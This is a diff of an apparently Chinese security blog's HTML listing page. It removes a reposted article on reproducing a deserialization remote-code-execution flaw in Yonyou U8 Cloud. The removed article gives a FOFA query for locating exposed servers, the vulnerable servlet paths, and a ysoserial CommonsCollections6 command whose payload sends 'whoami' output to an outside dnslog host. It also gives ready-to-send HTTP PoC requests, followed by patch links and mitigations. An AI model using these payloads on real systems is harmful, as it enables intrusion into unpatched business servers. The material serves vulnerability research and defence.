             <a href="/2025/11/13/Windows-802.1x/">
                 WIN10系统使用自带软件进行有线802.1X认证时的配置方法
             </a>
@@ -1024,71 +1212,6 @@ docker volume rm dependency-track:/data
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/GitLab/" rel="tag">GitLab</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/11/06/U8-Cloud-RCE/">
-                用友U8 Cloud 反序列化RCE漏洞复现
-            </a>
-        </h2>
-    
-    <time>
-        Nov 6, 2025
-    </time>
-    <section class="content">
-        <h1><span id="用友u8-cloud-反序列化rce漏洞复现">用友U8 Cloud 反序列化RCE漏洞复现</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://jishuzhan.net/article/1722119007621877762">OidBoy_G</a> 并作补充</p>
-</blockquote>
-<h2><span id="0x01-产品简介">0x01 产品简介</span></h2><blockquote>
-<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。</p>
-</blockquote>
-<h2><span id="0x02-漏洞概述">0x02 漏洞概述</span></h2><blockquote>
-<p>用友U8 Cloud存在多处（FileManageServlet和LoginVideoServlet）反序列化漏洞，系统未将用户传入的序列化数据进行过滤就直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成远程代码执行。</p>
-</blockquote>
-<h2><span id="0x03-影响范围">0x03 影响范围</span></h2><blockquote>
-<p>用友U8 Cloud 所有版本</p>
-</blockquote>
-<h2><span id="0x04-复现环境">0x04 复现环境</span></h2><blockquote>
-<p>FOFA：app&#x3D;”用友-U8-Cloud”</p>
-</blockquote>
-<h2><span id="0x05-漏洞复现">0x05 漏洞复现</span></h2><blockquote>
-<p>两处接口的反序列化漏洞路径：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span><br><span class="line">/servlet/~uap/nc.bs.sm.login2.LoginVideoServlet</span><br></pre></td></tr></table></figure>
-
-<p>PS：用友的反序列化漏洞大部分cc6就可以直接打，post请求传入反序列化的二进制数据 就可以进行命令执行，ysoserial工具集成了多种cc链，感兴趣的可以研究研究</p>
-<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/releases/tag/v0.0.6">https://github.com/frohoff/ysoserial/releases/tag/v0.0.6</a></p>
-<p>构造序列化数据(jdk1.8)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&quot;ping `whoami`.l4z6nq7x.dnslog.pw&quot;</span> &gt;4.ser</span><br></pre></td></tr></table></figure>
-
-<p>PoC</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">POST /servlet/~uap/nc.bs.sm.login2.LoginVideoServlet HTTP/1.1</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Host: your-ip</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Content-Type: *</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>PS：里面生成序列化数据文件的路径自行修改</p>
-<p>两个路径都可以打，自行测试</p>
-</blockquote>
-<h2><span id="0x06-修复建议">0x06 修复建议</span></h2><blockquote>
-<p><strong>官方修复方案</strong> ：</p>
-<p>用友安全中心已发布官方补丁：</p>
-<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=400">https://security.yonyou.com/#/noticeInfo?id=400</a></p>
-<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=399">https://security.yonyou.com/#/noticeInfo?id=399</a></p>
-<p><strong>临时修复方案：</strong></p>
-<p>使用ACL网络策略限制访问来源；</p>
-<p>使用防护类设备对&#x2F;servlet&#x2F;<del>uap&#x2F;nc.impl.pub.filesystem.FileManageServlet和&#x2F;servlet&#x2F;</del>uap&#x2F;nc.bs.sm.login2.LoginVideoServlet路径进行防护。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/U8Cloud/" rel="tag">U8Cloud</a>
             </div>
         
 
